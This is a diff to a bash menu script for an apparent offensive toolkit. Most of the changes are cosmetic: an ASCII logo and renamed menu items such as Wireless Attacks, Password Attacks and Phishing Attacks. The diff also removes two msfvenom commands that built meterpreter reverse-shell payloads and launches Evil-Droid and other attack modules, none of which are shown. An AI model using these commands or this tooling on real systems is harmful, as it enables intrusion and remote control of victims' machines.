@@ -46,6 +46,19 @@ function checkinternet()
     echo -e $red " Checking For Internet: ${white}CONNECTED"
   fi
 }
+logo(){
+  echo -e $red "        ..,;:ccccccc:;..."
+  echo -e $red "    ..,clllc:;;;;;;:cllc,."
+  echo -e $red "   .,cllc,..............';;'."
+  echo -e $red "  .;lol;......${white}_______${red}....;lol;."
+  echo -e $red " .,lol;......${white}/ _____/${red}.....;lol;..  "
+  echo -e $red " .coo.......${white}/ /${red}.............coo"            
+  echo -e $red ".'lol,.....${white}/ /${red}............'lol,."
+  echo -e $red ".,lol,....${white}/ /_____${red}........,lol,."
+  echo -e $red " .,lol,...${white}\______/${red}.......,lol,."
+  echo -e $red " .:ooc'.................:ooc'"
+  echo -e $red "  .'cllc'............''cllc."
+}
 
 #check OS
 check_os(){
@@ -58,15 +71,6 @@ pwd=$(pwd)
 
 dlhost=$(hostname -I)
 
-# Root Permission
-# if ! [ $(id -u) = 0 ]; then
-   # echo "You are not a not root User!"
-   # exit 1
-# fi
-# if [[ "$(whoami)" != root ]]; then
-# echo "You are not a root User "
-# exit 1
-# fi
 #check dependencies existence
 check_dependencies(){
 echo -e $white "" 
@@ -301,6 +305,7 @@ generator(){
     main
     esac
     }
+  logo
   echo -e $red "[ 1  ] Base64"
   echo -e $white "[ 2  ] MD5"
   echo -e $red "[ 3  ] ROT5"
@@ -312,7 +317,7 @@ generator(){
   echo ""
   echo -e $red "[ 99 ] Return to main menu" 
   echo -e $red    "..............................."
-  echo -e $white " Please select your option:"
+  echo -e $white "Please select your option:"
   echo ""
   read -p " [ → ] Enter choice> : " number_option
   echo ""
@@ -369,6 +374,7 @@ generator(){
 }
 #decoder main
 decoder_main(){
+  logo
   echo -e $red "[ 1  ] Base64"
   echo -e $white "[ 2  ] MD5"
   echo -e $red "[ 3  ] sha1"
@@ -378,11 +384,11 @@ decoder_main(){
   echo -e $red "[ 7  ] SHA512"
   echo -e $white "[ 8  ] Vigenere"
   echo ""
-  echo -e $whiteF "[ 99 ] Return to main menu" 
-  echo -e $red    "..............................."
-  echo -e $white " Please select your option:"
+  echo -e $red "[ 99 ] Return to main menu" 
+  echo -e $red    ""
+  echo -e $white "Select your option:"
   echo ""
-  read -p " [ → ] Enter choice> : " number_option
+  read -p "[ → ] Enter choice> : " number_option
   echo ""
   if [ $number_option -eq 1 ]; then
     python3 tola_atom/decoders/base64_dec.py
@@ -466,6 +472,7 @@ hash_decoder(){
 
   # Payload Generator
   payload_generator(){
+    logo
     echo -e $red " 1. Android               3. Windows"
     echo -e $white " 2. Linux                 4. MAC"
     echo -e $red " 5. PHP                   6. JSP"
@@ -656,14 +663,14 @@ echo -e $white "  ┖───────────────────�
   
   echo -e $white "    [ 1  ] Info_Gathering & Network"
   echo -e $red "    [ 2  ] Web Based Attacks"
-  echo -e $white "    [ 3  ] Keylogger"
+  echo -e $white "    [ 3  ] Wireless Attacks"
   echo -e $red "    [ 4  ] Payload Genetator"
-  echo -e $white "    [ 5  ] LaZagne"
+  echo -e $white "    [ 5  ] Password Attacks"
   echo -e $red "    [ 6  ] Infectious Media Genetator"
   echo -e $white "    [ 7  ] TBomb"
   echo -e $red "    [ 8  ] Hash & Cipher Generator"
   echo -e $white "    [ 9  ] Hash & Cipher Decoder"
-  echo -e $red "    [ 10 ] Phishing"
+  echo -e $red "    [ 10 ] Phishing Attacks"
   # echo -e $red "    [ 10 ] IP Locator"
   echo -e $white "    [ 11 ] Schedule whatsapp message"
   echo ""
@@ -694,7 +701,7 @@ cases_of_infectious(){
  case $number_option in
     1)
     clear
-    ./evil-droid.sh
+    bash Evil-Droid/evil-droid.sh
     ;;
     99) clear
         sleep 0.25
@@ -711,7 +718,7 @@ cases_of_infectious(){
 }
 # cases of framework from 1-9
 cases_of_framework(){
-  echo -e $red "    ..............................."
+  echo -e $white " " ""
   read -p  "     [ → ] Enter Choice > : " Number
 case $Number in 
  Network|network|N|n|1) 
@@ -725,20 +732,18 @@ case $Number in
   main
   ;;
  
-  Keylogger|keylogger|K|k|3)
-  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f elf > $pwd/$filename.elf
-  payload=linux/x86/meterpreter/reverse_tcp
-  echo " Your Payload has been generated successfully in $pwd directory"
+  Wireless|wireless|K|k|3)
+  sleep 0.25
+  sudo python2 wireless/wireless_network_based.py
   ;;
 
   Payload|payload|P|p|4)
   payload_generator
   ;;
   
-  LaZagne|lazagne|L|l|5)
-  msfvenom -p php/meterpreter_reverse_tcp LHOST="$lhost" LPORT="$lport" -f raw > $pwd/$filename.php
-  payload=php/meterpreter_reverse_tcp
-  echo " Your Payload has been generated successfully in $pwd directory"
+  Passwd|passwd|L|l|5)
+  sleep 0.25
+  sudo python2 passwd/password_based.py
   ;;
 
   Infectious|infectious|6)
